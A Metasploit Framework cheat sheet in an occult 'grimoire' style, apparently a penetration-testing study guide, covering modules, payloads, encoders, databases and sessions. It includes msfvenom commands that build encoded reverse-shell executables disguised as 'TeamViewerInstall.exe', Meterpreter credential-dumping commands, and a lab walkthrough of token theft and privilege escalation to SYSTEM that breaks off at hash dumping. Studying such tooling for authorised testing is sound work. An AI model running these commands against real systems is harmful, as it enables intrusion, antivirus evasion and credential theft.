# 🕷️ Metasploit Framework

_Within this eldritch grimoire lies a vast arsenal of arcane tools for network divination, weaving attacks, and unraveling the deepest secrets of target systems. Harness its dark power to evade the watchful eyes, ascend to forbidden privileges, and command dominion after the breach._

> _"To command the shadows is to master the unseen forces that bind the network."_

<details>
<summary><h2>⚠️ Warnings to the Seeker of Shrouded Truth ⚠️</h2></summary>

- **Do not get tunnel vision.**

  > _Beware the madness that comes from gazing too long into a single artifact. The Framework is but one relic among many—do not let it become your crutch or your altar. Use it with intent, not dependence._

- **Please read all the technical documentation you can find for any of our tools.**

  > _Before invoking forgotten runes, one must study the glyphs etched in the margins of the old tomes. Knowledge is the warding circle that keeps the daemon in the cage. Read. Absorb. Comprehend._

- **Many tools can prove to be unpredictable.**
  > _Every incantation comes with a price. Some conjurations may awaken watchers, leaving ghostly footprints across the target's domain. Others may tear open rifts in your own sanctum. Always proceed with wards in place and a retreat mapped._

</details>

---

<details>
<summary><h2>📥 Installation</h2></summary>

The official Metasploit Repository can be found [here](https://github.com/rapid7/metasploit-framework/).

**Install**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo apt update && sudo apt install metasploit-framework
```

</td>
</tr>
</table>

**Verify installation**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
msfconsole -q
```

</td>
</tr>
</table>

</details>

---

<details>
<summary><h2>📜 Introduction</h2></summary>

**Modules**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
ls /usr/share/metasploit-framework/modules
```

</td>
</tr>
</table>

**Plugins**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
ls /usr/share/metasploit-framework/plugins/
```

</td>
</tr>
</table>

**Scripts**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
ls /usr/share/metasploit-framework/scripts/
```

</td>
</tr>
</table>

**Tools**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
ls /usr/share/metasploit-framework/tools/
```

</td>
</tr>
</table>

</details>

---

<details>
<summary><h2>🧩 MSF Components</h2></summary>

<details>
<summary><h3>Modules</h3></summary>

Metasploit modules are pre-built scripts designed for specific tasks, each with corresponding functions that have been thoroughly developed and tested in real-world scenarios.

Within the msfconsole, users can choose from a comprehensive collection of available Metasploit modules. These modules are organized into folders, displayed in the following structure:

**Syntax**

<table width="100%">
<tr>
<td> 📄 <b>Module Syntax</b> </td>
</tr>
<tr>
<td>

```
<No.> <type>/<os>/<service>/<name>
```

</td>
</tr>
</table>

**Example**

<table width="100%">
<tr>
<td> 📄 <b>Module Example</b> </td>
</tr>
<tr>
<td>

```
794   exploit/windows/ftp/scriptftp_list
```

</td>
</tr>
</table>

<details>
<summary><h4>Explanation</h4></summary>

**Index No.**

The No. tag will be displayed to select the exploit we want afterward during our searches.

**Type**

The **Type** tag categorizes Metasploit modules at the highest level. By examining this field, we can determine the module's intended function. Some types—such as exploit modules—are not directly executable but exist for structural and organizational purposes.

The table below consolidates all possible module types, their descriptions, and indicates whether they can be directly interacted with (e.g., via **use <no.>**).

| Type      | Description                                                                                    | Interactable |
| --------- | ---------------------------------------------------------------------------------------------- | ------------ |
| Auxiliary | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality. | ✅           |
| Encoders  | Ensure that payloads are intact to their destination.                                          | ❌           |
| Exploits  | Exploit a vulnerability that allows for payload delivery.                                      | ✅           |
| NOPs      | (No Operation code) Keep payload sizes consistent across exploit attempts.                     | ❌           |
| Payloads  | Code that runs remotely and calls back to the attacker to establish a connection or shell.     | ❌           |
| Plugins   | Additional scripts integrated within assessments via `msfconsole`.                             | ❌           |
| Post      | Modules for information gathering, pivoting deeper into the network, and more.                 | ✅           |

**OS**

The OS tag indicates the target operating system and architecture for which the module was designed. Since different operating systems require distinct code execution methods, this tag ensures compatibility with the intended environment.

**Service**

The Service tag identifies the vulnerable service running on the target machine. However, for certain modules (e.g., auxiliary or post), this tag may represent a broader action—such as _gather_—which refers to activities like credential collection.

**Name**

The Name tag describes the module's core function—the specific action it performs for its intended purpose.

</details>

<details>
<summary><h4>Search</h4></summary>

**Search function**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
help search
```

</td>
</tr>
</table>

**Searching for a module**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
search eternalblue
```

</td>
</tr>
</table>

**Specific search**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

</td>
</tr>
</table>

**Specific payload search**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
grep meterpreter show payloads
```

</td>
</tr>
</table>

**Even more specific search**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
grep meterpreter grep reverse_tcp show payloads
```

</td>
</tr>
</table>

</details>

<details>
<summary><h4>Select</h4></summary>

**Select Module**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
use 0
```

</td>
</tr>
</table>

**Show options**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
options
```

</td>
</tr>
</table>

</details>

<details>
<summary><h4>Set</h4></summary>

**Target Specification**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
set RHOSTS <TARGET IP>
```

</td>
</tr>
</table>

**Permanent Target Specification**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
setg RHOSTS <TARGET IP>
```

</td>
</tr>
</table>

**Target Port Specification**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
set RPORT <TARGET PORT>
```

</td>
</tr>
</table>

**Attacker IP specification**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
set LHOST <ATTACKER IP>
```

</td>
</tr>
</table>

**Permanent Attacker IP specification**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
setg LHOST <ATTACKER IP>
```

</td>
</tr>
</table>

**Attacker Port Specification**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
set LPORT 4444
```

</td>
</tr>
</table>

</details>

<details>
<summary><h4>Information</h4></summary>

**Show info**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
info
```

</td>
</tr>
</table>

</details>

<details>
<summary><h4>Exploit Execution</h4></summary>

**Execute**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
run
```

</td>
</tr>
</table>

</details>

</details>

<details>
<summary><h3>Common Payloads</h3></summary>

The table below contains the most common payloads used for Windows machines and their respective descriptions.

| Payload                         | Description                                                         |
| ------------------------------- | ------------------------------------------------------------------- |
| generic/custom                  | Generic listener, multi-use                                         |
| generic/shell_bind_tcp          | Generic listener, multi-use, normal shell, TCP connection binding   |
| generic/shell_reverse_tcp       | Generic listener, multi-use, normal shell, reverse TCP connection   |
| windows/x64/exec                | Executes an arbitrary command (Windows x64)                         |
| windows/x64/loadlibrary         | Loads an arbitrary x64 library path                                 |
| windows/x64/messagebox          | Spawns a dialog via MessageBox with customizable title, text & icon |
| windows/x64/shell_reverse_tcp   | Normal shell, single payload, reverse TCP connection                |
| windows/x64/shell/reverse_tcp   | Normal shell, stager + stage, reverse TCP connection                |
| windows/x64/shell/bind_ipv6_tcp | Normal shell, stager + stage, IPv6 Bind TCP stager                  |
| windows/x64/meterpreter/$       | Meterpreter payload + varieties above                               |
| windows/x64/powershell/$        | Interactive PowerShell sessions + varieties above                   |
| windows/x64/vncinject/$         | VNC Server (Reflective Injection) + varieties above                 |

</details>

<details>
<summary><h3>Targets</h3></summary>

The **Target** field specifies particular operating system versions that the exploit module has been adapted to work with. These unique OS identifiers allow the module to customize its execution for specific system versions.

**Show Targets**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
show targets
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7
```

</td>
</tr>
</table>

**Select Targets**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
set target 6
```

</td>
</tr>
</table>

</details>

<details>
<summary><h3>Payloads</h3></summary>

In Metasploit, a payload is a module that enables successful exploitation, typically by establishing a shell session for the attacker.

**Show all payloads**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
show payloads
```

</td>
</tr>
</table>

The framework provides three distinct payload types:

<details>
<summary><h4>1. Singles</h4></summary>

A _Single_ payload contains the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. A Single payload can be as simple as adding a user to the target system or booting up a process.

</details>

<details>
<summary><h4>2. Stagers</h4></summary>

_Stager_ payloads work with Stage payloads to perform a specific task. A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host. Stagers are typically used to set up a network connection between the attacker and victim and are designed to be small and reliable.

</details>

<details>
<summary><h4>3. Stages</h4></summary>

_Stages_ are payload components that are downloaded by stager's modules.

Payload stages automatically use middle stagers:

- A single recv() fails with large payloads
- The Stager receives the middle stager
- The middle Stager then performs a full download
- Also better for RWX

</details>

</details>

<details>
<summary><h3>Staged Payloads</h3></summary>

A staged payload modularizes the exploitation process by separating functionality into discrete components. Each stage performs specific tasks while chaining together to execute the complete attack.

Like all payloads, its objectives are twofold:

1. Establish shell access on the target system

2. Maintain minimal footprint to evade AV/IPS detection

**Connection Methodology:**

- Stage 0 (Reverse Connection):
  - The victim host initiates contact back to the attacker

  - Lower detection risk as the connection originates from within the target's security trust zone

  - Establishes initial communication channel

- Stage 1 (Shell Access):
  - After stable connection is established

  - Attacker delivers the larger, more functional payload component

  - Typically provides full shell access and control

<details>
<summary><h4>Meterpreter Payload</h4></summary>

The Meterpreter payload is a specific type of multi-faceted payload that:

- Uses **DLL injection** to establish a stable and covert connection with the victim host.
- Is designed to be **difficult to detect** using simple or conventional system checks.
- Maintains **persistence** across system reboots or changes (depending on configuration).
- Resides **entirely in memory**, leaving **no traces on the hard drive**.
- Evades many **traditional forensic detection techniques**.
- Allows **dynamic loading and unloading of scripts and plugins** during runtime.

</details>

</details>

<details>
<summary><h3>Encoders</h3></summary>

Encoders have assisted with making payloads compatible with different processor architectures while at the same time helping with antivirus evasion. These architectures include:

- x64
- x86
- sparc
- ppc
- mips

Encoders were packed separately from the msfconsole script and were called **msfpayload** and **msfencode**. These two tools are located in _/usr/share/framework2/_.

**Generating Payload - Without Encoding**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<ATTACKER IP> LPORT=4444 -b "\x00" -f perl
```

</td>
</tr>
</table>

**Generating Payload - With Encoding**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<ATTACKER IP> LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

</td>
</tr>
</table>

**Generate a payload with the exe format, called TeamViewerInstall.exe**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=4444 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
```

</td>
</tr>
</table>

**Generate a payload with the exe format, called TeamViewerInstall.exe running it through multiple iterations**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=4444 -e x86/shikata_ga_nai -f exe -i 10 -o ./TeamViewerInstall.exe
```

</td>
</tr>
</table>

As anticipated, most commercial antivirus solutions can detect these payloads during real-world engagements. Therefore, additional evasion techniques become necessary to bypass modern endpoint protection systems.

</details>

<details>
<summary><h3>Databases</h3></summary>

The Metasploit Framework utilizes databases within msfconsole to systematically store and manage penetration testing results. The system features native PostgreSQL integration, providing:

**Key Benefits:**

- Instant access to scan results and historical data

- Efficient data management through direct database interaction

- Seamless import/export functionality for integration with external tools

<details>
<summary><h4>Setting up the Database</h4></summary>

**PostgreSQL Status**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo service postgresql status
```

</td>
</tr>
</table>

**Start PostgreSQL**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo systemctl start postgresql
```

</td>
</tr>
</table>

**Initiate a Database**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo apt-get upgrade metasploit-framework
sudo msfdb init
```

</td>
</tr>
</table>

**MSF - Database Status**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo msfdb status
```

</td>
</tr>
</table>

**MSF - Connect to the Initiated Database**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo msfdb run
```

</td>
</tr>
</table>

If your database is already configured but you're unable to modify the MSF user password, use the following command sequence:

**MSF - Reinitiate the Database**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
```

</td>
</tr>
</table>

**MSF - msf6 Database Status**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
db_status
```

</td>
</tr>
</table>

**MSF - Database Options**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
help database
```

</td>
</tr>
</table>

**MSF - Using Nmap Inside MSFconsole**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
db_nmap -sV -sS <TARGET IP>
```

</td>
</tr>
</table>

**MSF - Review scan results**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
hosts -h
services -h
creds -h
loot -h
```

</td>
</tr>
</table>

**MSF - Database Backup**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
db_export -f xml backup.xml
```

</td>
</tr>
</table>

</details>

</details>

<details>
<summary><h3>Plugins</h3></summary>

Metasploit plugins interact directly with the framework's API, enabling deep integration and control. They serve three primary purposes:

- Automation – Streamline repetitive tasks

- Extensibility – Add custom commands to msfconsole

- Enhancement – Expand the framework's built-in capabilities

**Listing plugins**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
ls /usr/share/metasploit-framework/plugins
```

</td>
</tr>
</table>

**MSF - Load Plugin**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
load nessus
nessus_help
```

</td>
</tr>
</table>

**Downloading plugins**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
git clone https://github.com/darkoperator/Metasploit-Plugins
ls Metasploit-Plugins
```

</td>
</tr>
</table>

**MSF - Copying Plugin to MSF**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```

</td>
</tr>
</table>

**MSF - Load the new plugin**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
load pentest
help
```

</td>
</tr>
</table>

</details>

</details>

---

<details>
<summary><h2>🤝 MFS Sessions</h2></summary>

<details>
<summary><h3>Sessions</h3></summary>

**Multi-Session Management in MSFconsole**

MSFconsole supports concurrent management of multiple modules and sessions. Key capabilities include:

1. Session Switching – Seamlessly transition between active sessions

2. Module Linking – Attach new modules to backgrounded sessions

3. Job Conversion – Convert sessions into persistent background jobs

**Important Notes:**

- Backgrounded sessions maintain active connections to target hosts

- Sessions may terminate unexpectedly due to:
  - Payload execution failures

  - Communication channel disruptions

**Backgrounding Sessions in MSFconsole**

Active sessions can be backgrounded when they maintain communication with the target host. This allows operators to:

- Preserve established connections

- Switch between multiple engagements

- Deploy additional modules without session interruption

**Backgrounding Methods:**

1. Keyboard Shortcut: CTRL+Z (Universal)

2. Meterpreter Command: meterpreter > bg

**Process Flow:**

1. Initiate background request

2. Confirm action via prompt

3. Return to msf6

4. Immediately deploy new modules

**Listing Active Sessions**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
sessions
```

</td>
</tr>
</table>

**Interacting with a Session**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
sessions -i 1
```

</td>
</tr>
</table>

</details>

<details>
<summary><h3>Jobs</h3></summary>

When an active exploit occupies a port needed for another module, improper termination (e.g., CTRL+C) leaves the port bound. Instead, follow this procedure:

**1. Check Active Jobs**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
jobs -l
```

</td>
</tr>
</table>

**2. Terminate Conflicts**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
jobs -k <ID>
```

</td>
</tr>
</table>

**Jobs Command Help Menu**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
jobs -h
```

</td>
</tr>
</table>

**Running an Exploit as a Background Job**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
exploit -j
```

</td>
</tr>
</table>

</details>

<details>
<summary><h3>Meterpreter</h3></summary>

The Meterpreter payload is an advanced, modular attack platform that employs sophisticated techniques to maintain stealth and persistence:

<details>
<summary><h4>Objectives</h4></summary>

- Provide a stable, extensible platform for internal host enumeration

- Facilitate rapid privilege escalation path discovery

- Enable advanced defensive evasion techniques

</details>

<details>
<summary><h4>Capabilites</h4></summary>

- Utilizes reflective DLL injection for stable, low-detectability implants

- Supports memory-only operation (no disk artifacts)

- Features configurable persistence mechanisms

</details>

<details>
<summary><h4>Operational Advantages</h4></summary>

1.  Stealth Characteristics
    - No traditional process spawning

    - Avoids disk writes (in-memory execution only)

    - Encrypted communications channel

2.  Persistence Options
    - Survives system reboots when properly configured

    - Maintains sessions through network changes

    - Supports migration between processes

3.  Extended Functionality

        * Modular architecture for on-demand capability expansion

        * Built-in privilege escalation techniques

        * Comprehensive post-exploitation toolkit

    </details>

<details>
<summary><h4>Using Meterpreter</h4></summary>

**Displays a list of available Meterpreter commands and their descriptions.**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
help
```

</td>
</tr>
</table>

**Shows the current user (UID) that the Meterpreter session is running under.**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
getuid
```

</td>
</tr>
</table>

**Lists all running processes on the target system, including PIDs and owners.**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
ps
```

</td>
</tr>
</table>

**Steals the security token from a specified process (PID 1836) to impersonate its privileges.**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
steal_token 1836
```

</td>
</tr>
</table>

**Dumps the password hashes of all local user accounts (stored in the SAM database).**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
hashdump
```

</td>
</tr>
</table>

**Extracts and displays password hashes from the Security Account Manager (SAM) via the LSASS process.**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
load kiwi
lsa_dump_sam
```

</td>
</tr>
</table>

**Retrieves encrypted secrets (like cached credentials and auto-login passwords) from the LSASS memory.**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
lsa_dump_secrets
```

</td>
</tr>
</table>

</details>

<details>
<summary><h4>Example Compromise Walkthrough</h4></summary>

**MSF - Meterpreter Migration**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
getuid
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
[-] 1055: Operation failed: Access is denied.
```

</td>
</tr>
</table>

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
ps
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 216   1080  cidaemon.exe
 272   4     smss.exe
 292   1080  cidaemon.exe
<...SNIP...>

1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
```

</td>
</tr>
</table>

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
steal_token 1836
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
Stolen token with username: NT AUTHORITY\NETWORK SERVICE
```

</td>
</tr>
</table>

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
getuid
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
Server username: NT AUTHORITY\NETWORK SERVICE
```

</td>
</tr>
</table>

**MSF - Meterpreter Background and Local Exploit Suggester**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
bg
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
Background session 1? [y/N]  y
```

</td>
</tr>
</table>

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
search local_exploit_suggester
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                       ---------------  ----    -----  -----------
   0  post/multi/recon/ local_exploit_suggester                   normal   No     Multi Recon Local Exploit Suggester
```

</td>
</tr>
</table>

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
use 0
show options
set SESSION 1
run
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 34 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

</td>
</tr>
</table>

**MSF - Privilege Escalation**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
use exploit/windows/local/ms15_051_client_copy_images
show options
set SESSION 1
set LHOST tun0
run
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 10.10.14.26:4444
[*] Launching notepad to host the exploit...
[+] Process 844 launched.
[*] Reflectively injecting the exploit DLL into 844...
[*] Injecting exploit into 844...
[*] Exploit injected. Injecting payload into 844...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.14.26:4444 -> 10.10.10.15:1031) at 2020-09-03 10:35:01 +0000
```

</td>
</tr>
</table>

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
getuid
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
Server username: NT AUTHORITY\SYSTEM
```

</td>
</tr>
</table>

**MSF - Dumping Hashes**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
